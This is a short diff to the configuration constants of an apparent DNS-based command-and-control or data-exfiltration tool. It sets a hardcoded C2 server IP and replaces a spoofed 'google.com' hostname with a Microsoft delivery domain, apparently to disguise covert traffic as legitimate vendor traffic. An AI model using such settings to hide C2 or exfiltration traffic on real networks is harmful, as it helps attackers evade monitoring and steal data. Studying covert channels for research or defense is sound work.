@@ -3,10 +3,10 @@
 REQUEST_TYPE_ERR = "The request type must be one of the following: PING, DATA, RECEIPT"
 PING_INTERVAL = 10
 
-INTERFACE = "en0"
+INTERFACE = "esn3"
 SNIFF_FILTER = "src port 53"
 
-CC_SERVER_SPOOFED_HOST = "google.com"
+CC_SERVER_SPOOFED_HOST = "cp501-prod.do.dsp.microsoft.com"
 CC_SERVER_IP = "130.245.171.134"
 
 DATA_CHUNK_SIZE = 255
